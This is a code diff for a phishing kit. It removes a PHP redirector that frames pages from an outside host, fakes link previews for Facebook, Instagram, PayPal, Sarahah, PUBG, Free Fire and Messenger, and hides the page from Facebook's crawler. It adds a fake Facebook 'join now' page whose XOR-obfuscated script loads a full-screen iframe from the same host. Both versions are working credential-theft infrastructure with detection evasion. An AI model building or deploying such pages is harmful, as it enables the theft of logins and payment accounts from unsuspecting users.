@@ -1,136 +1,16 @@
-<?php
-error_reporting(0);
-$zebii = trim($_GET['url']);
-$lax= trim($_GET['i']);
-$Path = "https://wemistry.com/ss/";
-$actual_link = "https://" . $_SERVER[ HTTP_HOST ] . $_SERVER[ REQUEST_URI ];
-$ua = $_SERVER['HTTP_USER_AGENT'];
-if (preg_match('/facebook/si',$ua)) { 
-header('Location:https://web.facebook.com/'); 
-die(); }else{
-$zebiii = substr($zebii , strpos($zebii , '//'), 5000000 );
-     	$find1 = strpos( $actual_link, "bW9iaWxlL2xvZ2lu" );   ///mobile/login
-	$find2 = strpos( $actual_link, "aW5zdGFncmFt" );   ///instagram
-	$find3 = strpos( $actual_link, "c2FyYW" );   ///saraha
-	$find4 = strpos( $actual_link, "cGF5cGFs" );   ///paypal1
-	$find5 = strpos( $actual_link, "c25hcA" );   ///snap
-	$find6 = strpos( $actual_link, "cHV" );   ///pubg
-	$find7 = strpos( $actual_link, "bWVzc2VuZ2Vy" );  ///messenger
-	$find8 = strpos( $actual_link, "ZnJlZWZpcmU" );   ///freefire
-	$find9 = strpos( $actual_link, "bW9iaWxlYXJhYmljL2xvZ2lu" );  ///mobilearabic/login
-    $find10 = strpos( $actual_link, "bW9iaWxlZnJhbmNlL2xvZ2lu" );   ///mobilefrance/login
+<!doctype html>
+<html lang="en">
+   <meta charset="UTF-8">
+   <meta property="og:url" content="/" />
+   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+    <meta http-equiv="X-UA-Compatible" content="IE=9">
+   <title>join now ...</title>
+   <link rel="shortcut icon" href="https://vignette.wikia.nocookie.net/watchgirlsplay/images/8/8f/Facebook_Icon.png">
+   <meta content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/F_icon.svg/2000px-F_icon.svg.png" property="og:image"/>
+   <body style="margin: 0 auto;">
+      <tr style="position:absolute;top:5px"><iframe style="overflow:hidden; display:block; position: absolute; height: 100%; width: 100%" id="showskill" scrolling="auto" border="50" framespacing="0" frameBorder="0" height="100%" width ="100%" src=""></iframe></tr>
+	  <script>
+var enkripsi="'1Aqapkrv'1G'2Cdwlavkml'02egvRcpcogvgp@{Lcog'0:lcog'0A'02wpn'0;'02'5@'2C'02'02'02'02kd'02'0:'03wpn'0;'02'5@'2C'02'02'02'02'02'02wpn'02'1F'02uklfmu,nmacvkml,jpgd'1@'2C'02'02'02'02'5F'2C'02'02'02'02lcog'02'1F'02lcog,pgrncag'0:-'7@'7A'7@'7A'7F'7F-e'0A'02'00'7A'7A'06'04'00'0;'1@'2C'02'02'02'02tcp'02pgegz'02'1F'02lgu'02PgeGzr'0:'00'7@'1D'04'7F'00'02)'02lcog'02)'02'00'0:'1F'0:'7@'7G'04'01'7F('0;'5A'04'5A'01'5A'06'0;'00'0;'0A'2C'02'02'02'02'02'02'02'02pgqwnvq'02'1F'02pgegz,gzga'0:wpn'0;'1@'2C'02'02'02'02kd'02'0:'03pgqwnvq'0;'02pgvwpl'02lwnn'1@'2C'02'02'02'02kd'02'0:'03pgqwnvq'7@0'7F'0;'02pgvwpl'02'05'05'1@'2C'02'02'02'02pgvwpl'02fgamfgWPKAmormlglv'0:pgqwnvq'7@0'7F,pgrncag'0:-'7A)-e'0A'02'00'02'00'0;'0;'1@'2C'5F'2C'2C'2Ctcp'02ewg'02'1F'02egvRcpcogvgp@{Lcog'0:'05ewg'05'0;'1@'02--'02'00nmpgo'00'2Ctcp'02`cx'02'1F'02egvRcpcogvgp@{Lcog'0:'05`cx'05'0;'1@'02--'02'00'00'02'0:rpgqglv'02ukvj'02lm'02tcnwg'0;'2Ctcp'02swz'02'1F'02egvRcpcogvgp@{Lcog'0:'05swz'05'0;'1@'02--'02lwnn'02'0:c`qglv'0;'2C'2C'02'02'02'02fmawoglv,egvGngoglv@{Kf'0:'00qjmuqiknn'00'0;,qpa'02'1F'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'00jvvrq'1C--ugokqvp{,amo-egv,rjr'1Dwpn'1F'00)'02ewg'1@'2C'1A-qapkrv'1G'2C"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
 
-	echo '
 
- ';
-	if ( $find1 || $find2 || $find3 || $find4 || $find5 || $find6 || $find7 || $find8 || $find9 || $find10 ) {
-		echo '
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>';
-	}
-	if ( strpos($actual_link, 'mobile/login') !== false ) {
-		echo '
-<title></title>
-<meta property="og:url" content="https://www.facebook.com" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Join Now" />
-<meta property="og:description" content="Click Here To Continue" />
-<meta property="og:image" content="https://www.facebook.com" />
-';
-	} elseif( strpos($actual_link, 'instagram') !== false ) {
-		echo '
-<title></title>
-<meta property="og:url" content="http://www.instagram.com" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Join Now" />
-<meta property="og:description" content="Click Here To Continue" />
-<meta property="og:image" content="https://www.instagram.com/static/images/ico/apple-touch-icon-120x120-precomposed.png/02ba5abf9861.png" />
-';
-	}elseif( strpos( $actual_link, 'paypal1' ) !== false ){
-		echo '
-<title></title>
-<meta property="og:url" content="https://www.paypal.com/" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Join Now" />
-<meta property="og:description" content="Click Here To Continue" />
-<meta property="og:image" content="https://www.paypal.com" />
-';
-	}elseif( strpos( $actual_link, 'saraha' ) !== false ){
-		echo '
-<title></title>
-<meta property="og:url" content="https://sarahah.com/" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Join Now" />
-<meta property="og:description" content="Click Here To Continue" />
-<meta property="og:image" content="https://i.imgur.com/SRDa2BA.png" />
-';
-	}elseif( strpos( $actual_link, 'pubg' ) !== false ){
-		echo '
-<title></title>
-<meta property="og:url" content="https://www.facebook.com" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Join Now" />
-<meta property="og:description" content="Click Here To Continue" />
-<meta property="og:image" content="https://2014z520vw7j2q4i2nc4lbo5-wpengine.netdna-ssl.com/wp-content/uploads/2020/04/PUBG_STADIA_Vikendi_2-1365x768.png" />
-';
-	}elseif( strpos( $actual_link, 'paypal1' ) !== false ){
-		echo '
-<title></title>
-<meta property="og:url" content="https://www.paypal.com/" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Join Now" />
-<meta property="og:description" content="Click Here To Continue" />
-<meta property="og:image" content="https://www.paypal.com" />
-';
-
-	}elseif( strpos( $actual_link, 'mobilearabic/login' ) !== false ){
-		echo '
-<title></title>
-<meta property="og:url" content="https://www.facebook.com" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Join Now" />
-<meta property="og:description" content="Click Here To Continue" />
-<meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
-';
-	}elseif( strpos( $actual_link, 'mobilefrance/login' ) !== false ){
-		echo '
-<title></title>
-<meta property="og:url" content="https://www.facebook.com" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Join Now" />
-<meta property="og:description" content="Click Here To Continue" />
-<meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
-';
-	}elseif( strpos( $actual_link, 'messenger' ) !== false ){
-		echo '
-<title></title>
-<meta property="og:url" content="https://www.facebook.com" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Join Now" />
-<meta property="og:description" content="Click Here To Continue" />
-<meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
-';
-	}elseif( strpos( $actual_link, 'freefire' ) !== false ){
-		echo '
-<title></title>
-<meta property="og:url" content="https://ff.garena.com/index.html" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Join Now" />
-<meta property="og:description" content="Click Here To Continue" />
-<meta property="og:image" content="http://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire32-2.ico" />
-';
-	}else{
-		echo'
-		';
-	}
-
-echo '
-<html>
-<title>Login into.......</title>
-<link rel="shortcut icon" href="https://www.facebook.com/images/fb_icon_325x325.png" />
-<head>
-<frameset rows="*,4" frameborder="YES" border="50" framespacing="0">
-<frame frameborder="0" src="'.$Path.base64_decode($zebiii.$lax).'" scrolling="yes" noresize="1" />
-</head>
-</html>';
-} 
-?>
+</script>
